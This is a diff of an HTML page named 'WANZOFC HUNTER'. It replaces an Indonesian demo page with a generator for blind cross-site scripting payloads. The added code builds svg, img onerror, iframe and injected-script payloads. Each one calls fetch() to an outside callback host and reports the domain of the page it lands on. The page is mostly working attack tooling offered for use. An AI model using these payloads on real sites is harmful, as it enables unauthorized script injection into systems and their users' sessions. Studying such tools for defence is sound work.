@@ -1,152 +1,153 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WanzOfc Hunter Demo</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-  <style>
-    /* (CSS sama seperti sebelumnya, beberapa dimodifikasi) */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Poppins', sans-serif;
-    }
-    body {
-      background: linear-gradient(135deg, #1e1e2f, #2e2e4f);
-      color: #fff;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      overflow: hidden;
-    }
-    .container {
-      background: #2c2c3e;
-      padding: 2rem;
-      border-radius: 15px;
-      box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-      width: 90%;
-      max-width: 400px;
-      text-align: center;
-    }
-    h1 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-    }
-    p {
-      font-size: 1rem;
-      margin-bottom: 1.5rem;
-      color: #ccc;
-    }
-    button {
-      padding: 8px 16px; /* Ukuran tombol lebih kecil */
-      border: none;
-      background-color: #4f46e5;
-      color: white;
-      border-radius: 5px; /* Radius lebih kecil */
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      font-size: 0.9rem; /* Font size lebih kecil */
-    }
-    button:hover {
-      background-color: #4338ca;
-    }
-    .animated {
-      opacity: 0;
-      transform: translateY(50px);
-      transition: opacity 0.6s ease-out, transform 0.6s ease-out;
-    }
-    .animated.show {
-      opacity: 1;
-      transform: translateY(0);
-    }
-    .copy-container {
-      display: flex;
-      align-items: center;
-      margin-bottom: 1rem;
-    }
-    .copy-input {
-      flex-grow: 1;
-      padding: 6px;  /* Ukuran padding lebih kecil */
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      color: #333;
-      font-size: 0.8rem; /* Ukuran font lebih kecil */
-      width: 150px; /* Lebar input lebih kecil */
-    }
-    .copy-button {
-      background-color: #6c757d;
-      color: white;
-      border: none;
-      padding: 6px 10px; /* Ukuran padding lebih kecil */
-      border-radius: 5px;
-      cursor: pointer;
-      margin-left: 8px;
-      transition: background-color 0.3s ease;
-      font-size: 0.8rem; /* Ukuran font lebih kecil */
-    }
-    .copy-button:hover {
-      background-color: #5a6268;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="ANZOFC HUNTER HACKING.">
+    <title>WANZOFC HUNTER</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 600px;
+        }
+
+        input, button {
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+        }
+
+        .copy-button {
+            background: none;
+            border: none;
+            padding: 0;
+            font-size: 1.2rem;
+            color: #007bff;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+    </style>
 </head>
 
 <body>
 
-  <div class="container animated">
-    <h1>Selamat Datang!</h1>
-    <p>Website ini dibuat untuk mendemokan payload WanzOfc Hunter.</p>
+    <div class="container">
 
-    <div class="copy-container">
-      <input type="text" id="textToCopy" class="copy-input" value="Teks yang akan disalin" >
-      <button class="copy-button" onclick="copyText()"><i class="fas fa-copy"></i> Salin</button>
+        <h1>WANZOFC HUNTER</h1>
+
+        <label for="payload-type">Payload Type:</label>
+        <select id="payload-type">
+            <option value="svg">SVG</option>
+            <option value="onerror">OnError</option>
+            <option value="iframe">IFrame</option>
+            <option value="script">Script</option>
+            <option value="img">Img</option>
+        </select>
+
+        <div class="input-group">
+            <input type="text" id="callback-url" value="http://wanzofc-hunter.up.railway.apl/payload" readonly>
+            <button class="copy-button" onclick="copyCallbackURL()" title="Copy to Clipboard">
+                <i class="fas fa-copy"></i>
+            </button>
+        </div>
+
+        <label for="iframe-url">Iframe URL:</label>
+        <div class="input-group">
+            <input type="text" id="iframe-url" value="{{IFRAME_URL_INPUT}}">
+            <button class="copy-button" onclick="copyIframeURL()" title="Copy to Clipboard">
+                <i class="fas fa-copy"></i>
+            </button>
+        </div>
+
+        <button onclick="generatePayload()">create payload</button>
+
+        <div id="payload-container"></div>
+
+    <script>
+        function generateAutoPayload(type) {
+            const callbackURL = document.getElementById('callback-url').value;
+            const iframeURL = document.getElementById('iframe-url').value;
+
+             if (type === 'script') {
+                 const script = document.createElement('script');
+                 script.textContent = `fetch('${callbackURL}?xss=' + encodeURIComponent(document.domain))`;
+                 document.body.appendChild(script);
+                 return "Payload script injected";
+            } else {
+
+                const payloadTemplates = {
+                    onerror: `onerror=fetch('${callbackURL}?xss=' + encodeURIComponent(document.domain))`,
+                     svg: `<svg onload=fetch('${callbackURL}?xss=' + encodeURIComponent(document.domain))>`,
+                     iframe: `<iframe src="${iframeURL}" onload="fetch('${callbackURL}?xss=' + encodeURIComponent(document.domain))"></iframe>`,
+
+                     img: `<img src=x onerror=fetch('${callbackURL}?xss='+encodeURIComponent(document.domain))>`,
+                };
+                 return payloadTemplates[type] || '';
+            }
+        }
+
+        function generatePayload() {
+            const selectedPayload = document.getElementById('payload-type').value;
+            const generatedPayload = generateAutoPayload(selectedPayload);
+
+            if(selectedPayload !== 'script'){
+
+                document.getElementById('payload-container').innerText = generatedPayload;
+            }
+
+
+        }
+
+        function copyCallbackURL() {
+            navigator.clipboard.writeText(document.getElementById('callback-url').value)
+                .then(() => alert('Callback URL copied!'))
+                .catch(err => console.error('Failed to copy: ', err));
+        }
+
+        function copyIframeURL() {
+            navigator.clipboard.writeText(document.getElementById('iframe-url').value)
+                .then(() => alert('Iframe URL copied!'))
+                .catch(err => console.error('Failed to copy: ', err));
+        }
+
+        window.onload = generatePayload;
+    </script>
     </div>
-
-    <button id="klikSaya">Klik Saya</button>
-  </div>
-
-  <!-- GSAP for animation -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
-
-  <script>
-    window.addEventListener('load', () => {
-      gsap.to('.animated', { 
-        opacity: 1, 
-        y: 0, 
-        duration: 1, 
-        ease: "power3.out",
-        onStart: () => document.querySelector('.animated').classList.add('show')
-      });
-    });
-
-    document.getElementById('klikSaya').addEventListener('click', () => {
-      // Kirim data klik ke server
-      fetch('/klik', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          event: 'tombol_diklik',
-          time: new Date().toISOString(),
-          userAgent: navigator.userAgent,
-          page: location.href
-        })
-      })
-      .then(response => response.text())
-      .then(data => console.log('Server response:', data))
-      .catch(err => console.error('Error:', err));
-    });
-
-    function copyText() {
-      const copyText = document.getElementById("textToCopy");
-      copyText.select();
-      copyText.setSelectionRange(0, 99999); // For mobile devices
-      document.execCommand("copy");
-      alert("Teks berhasil disalin: " + copyText.value);
-    }
-  </script>
 </body>
 </html>
